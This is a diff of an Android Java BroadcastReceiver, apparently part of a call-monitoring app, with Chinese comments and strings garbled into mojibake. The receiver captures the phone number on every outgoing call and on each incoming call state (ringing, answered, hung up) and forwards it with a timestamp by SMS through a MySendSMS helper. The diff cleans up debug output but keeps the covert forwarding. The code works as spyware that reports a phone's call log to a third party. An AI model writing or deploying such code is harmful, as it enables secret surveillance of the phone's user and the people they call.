@@ -31,29 +31,23 @@ public class CallReceiver extends BroadcastReceiver{
 	public void onReceive(Context context, Intent intent) {
 		tcontext=context;
 		tintent = intent;
-		// TODO Auto-generated method stub
+		
+		
 		if(intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)){
-			String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
-			phonenum=phoneNumber;
-			System.out.println(TheTime+"∫ÙΩ– :"+phoneNumber);
-			MySendSMS(TheTime+":outgoing call "+phoneNumber,context,intent);
+			//ªÒ»°≤¶¥Ú∂‘œÛµƒ∫≈¬Î
+			phonenum = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
+			MySendSMS(TheTime+":outgoing call "+phonenum,context,intent);
 		}else{
             TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);  
             switch (tm.getCallState()) {  
             case TelephonyManager.CALL_STATE_RINGING:  
                 phonenum = intent.getStringExtra("incoming_number");  
-                System.out.println(TheTime+"œÏ¡Â:¿¥µÁ∫≈¬Î"+phonenum);
-//                mylocationMessage(TheTime+":œÏ¡Â "+phonenum);
                 MySendSMS(TheTime+":œÏ¡Â "+phonenum,context,intent);
                 break;  
             case TelephonyManager.CALL_STATE_OFFHOOK:  
-                System.out.println(TheTime+"Ω”Ã˝"+phonenum);
-//                mylocationMessage(TheTime+":Ω”Ã˝ "+phonenum);
                 MySendSMS(TheTime+":Ω”Ã˝ "+phonenum,context,intent);
                 break;  
             case TelephonyManager.CALL_STATE_IDLE:  
-                System.out.println(TheTime+"π“∂œ"+phonenum);
-//                mylocationMessage(TheTime+":π“∂œ "+phonenum);
                 MySendSMS(TheTime+":π“∂œ "+phonenum,context,intent);
                 break;  
             } 
